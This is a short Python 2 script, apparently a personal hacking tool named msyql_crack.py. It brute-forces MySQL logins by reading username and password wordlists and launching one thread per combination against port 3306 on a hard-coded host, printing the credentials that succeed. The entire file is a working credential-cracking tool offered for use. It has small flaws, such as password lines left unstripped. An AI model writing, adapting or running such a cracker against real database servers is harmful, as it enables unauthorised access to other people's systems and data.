#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Time   :  18-6-25 上午4:40
# Author :  xiaodong
# File   :  msyql_crack.py

import pymysql

import threading

import argparse

def mysqlcrack(host,username,password):

    try:
        connection = pymysql.connect(host=host, port=3306, user=username, password=password, db='testdb',
                                     charset='utf8mb4', cursorclass=pymysql.cursors.DictCursor)
        print "succeed user {} pass {}".format(username,password)
    except Exception as e:
        pass


def main():
    #parser = argparse.ArgumentParser()
    #parser.add_argument('host',help='host')
    #parser.add_argument('port',help='port')
    #parser.add_argument('userlist',help='userdic')
    #parser.add_argument('passlist',help='passdic')

    #args = parser.parse_args()

    host = '127.0.0.1'
    #port = args.port
    ##passfile = args.passlist
    userlst = []
    passlst = []
    ufile=open('user.txt','r')
    pfile = open('pass.txt', 'r')

    for line in ufile:
        userlst.append(line.strip())

    for line in pfile:
        passlst.append(line)

    for line in userlst:
        username = line
        for line in passlst:
            password =line
            t= threading.Thread(target=mysqlcrack,args=(host,username,password))
            t.start()


if __name__=="__main__":
    main()



